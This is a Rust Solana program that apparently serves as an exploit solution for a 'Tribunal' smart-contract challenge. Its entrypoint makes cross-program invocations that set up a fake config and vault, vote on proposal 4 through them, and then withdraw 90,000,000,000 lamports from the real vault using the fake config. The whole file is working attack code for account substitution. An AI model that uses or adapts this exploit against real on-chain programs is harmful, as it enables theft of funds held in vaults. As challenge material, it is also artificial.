#![cfg(not(feature = "no-entrypoint"))]

use solana_program::declare_id;
use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::account_info::next_account_info;
use solana_program::program::invoke;
use solana_program::msg;

use solana_program::{
    account_info::AccountInfo,
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    system_program,
    system_instruction,
    rent::Rent,
};

use crate::*;

declare_id!("My11111111111111111111111111111111111111112");
    
entrypoint!(process_instruction);
    fn process_instruction(
        program_id: &Pubkey,
        accounts: &[AccountInfo],
        instruction_data: &[u8],
    ) -> ProgramResult {
        let account_iter = &mut accounts.iter();
        let program = next_account_info(account_iter)?;
        let user = next_account_info(account_iter)?;
        let config_addr = next_account_info(account_iter)?;
        let vault_addr = next_account_info(account_iter)?;
        let fake_config_addr = next_account_info(account_iter)?;;
        let fake_vault_addr = next_account_info(account_iter)?;
        let p4_addr = next_account_info(account_iter)?;
        let my_pg = next_account_info(account_iter)?;
        let sp = next_account_info(account_iter)?;

        let (_fake_config_addr, fake_config_bump) = find_my_program_address(&["CONFIG".as_bytes()], &program.key).unwrap();
        let (_fake_vault_addr, fake_vault_bump) = find_my_program_address(&["VAULT".as_bytes()], &program.key).unwrap();
        let (_p4_addr, _) = Pubkey::find_program_address(&["PROPOSAL".as_bytes(), &4_u8.to_be_bytes()], &program.key);

  

        let fisrt = Instruction::new_with_borsh(
            program.key.clone(),
            &TribunalInstruction::Initialize  {
                config_bump: fake_config_bump, 
                vault_bump: fake_vault_bump,
            },
            vec![
                AccountMeta::new(user.key.clone(), true),
                AccountMeta::new(fake_config_addr.key.clone(), false),
                AccountMeta::new(fake_vault_addr.key.clone(), false),
                AccountMeta::new_readonly(program.key.clone(), false),
                AccountMeta::new_readonly(sp.key.clone(), false),
            ],
        );

        invoke(&fisrt, 
            &[
                user.clone(),
                fake_config_addr.clone(),
                fake_vault_addr.clone(),
                sp.clone(),
                my_pg.clone(),
                program.clone(),
        ]);


        
        let fisrt = Instruction::new_with_borsh(
            program.key.clone(),
            &TribunalInstruction::Vote { proposal_id: 4, amount: 1 },
            vec![
                AccountMeta::new(user.key.clone(), true),
                AccountMeta::new(fake_config_addr.key.clone(), false),
                AccountMeta::new(fake_vault_addr.key.clone(), false),
                AccountMeta::new(p4_addr.key.clone(), false),
                AccountMeta::new_readonly(program.key.clone(), false),
                AccountMeta::new_readonly(sp.key.clone(), false),
            ],
        );

        invoke(&fisrt, 
            &[
                user.clone(),
                fake_vault_addr.clone(),
                fake_config_addr.clone(),
                p4_addr.clone(),
                sp.clone(),
                my_pg.clone(),
                program.clone(),
        ]);


        let fisrt = Instruction::new_with_borsh(
            program.key.clone(),
            &TribunalInstruction::Withdraw { amount: 90_000_000_000},
            vec![
                AccountMeta::new(user.key.clone(), true),
                AccountMeta::new(fake_config_addr.key.clone(), false),
                AccountMeta::new(vault_addr.key.clone(), false),
                AccountMeta::new_readonly(program.key.clone(), false),
                AccountMeta::new_readonly(sp.key.clone(), false),
            ],
        );

        invoke(&fisrt, 
            &[
                user.clone(),
                vault_addr.clone(),
                fake_config_addr.clone(),
                sp.clone(),
                my_pg.clone(),
                program.clone(),
        ]);



        Ok(())        
    }